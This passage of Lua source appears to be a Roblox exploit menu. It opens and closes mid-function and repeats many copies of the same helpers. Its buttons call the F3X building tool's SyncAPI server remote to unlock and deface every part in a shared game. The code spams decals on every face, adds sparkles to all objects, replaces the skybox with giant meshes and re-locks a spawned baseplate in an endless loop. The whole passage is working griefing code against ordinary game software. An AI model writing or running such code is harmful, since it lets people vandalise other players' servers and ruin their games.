					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("172423468")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.24, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "shedletsky decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("85312612489831")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.24, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "sparkle all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Sparkles"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()

	local player = game.Players.LocalPlayer
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.24, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "spawn baseplate"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent,types)
		local args = {
			[1] = "CreatePart",
			[2] = types,
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end

	function Material(part,mate)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Material"] = mate
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function toptexturecreate(part)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = Enum.NormalId.Top,
					["TextureType"] = "Texture"
				}
			}
		}

		_(args)
	end
	function toptextureadd(part)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = Enum.NormalId.Top,
					["TextureType"] = "Texture",
					["Texture"] = "rbxassetid://123970246979229",
					["StudsPerTileV"] = 50,
					["StudsPerTileU"] = 50,

				}
			}
		}
		_(args)
	end
	hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
	hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
	hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
	function SpawnBasePlate()
		CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
		for i,v in game.Workspace:GetChildren() do
			if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
				spawn(function()
					Resize(v,Vector3.new(500,10,500),CFrame.new(hrpx,hrpy-20,hrpz))
					Color(v,Color3.fromRGB(0,0,0))
					toptexturecreate(v)
					toptextureadd(v)
					while wait(1) do
						pcall(function()SetLocked(v,true)end)
					end
				end)
			end
		end
	end
	SpawnBasePlate()
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.24, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "skybox 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("123970246979229")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.31, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "decal spam 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("123970246979229")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.31, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "Blue2spooky skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
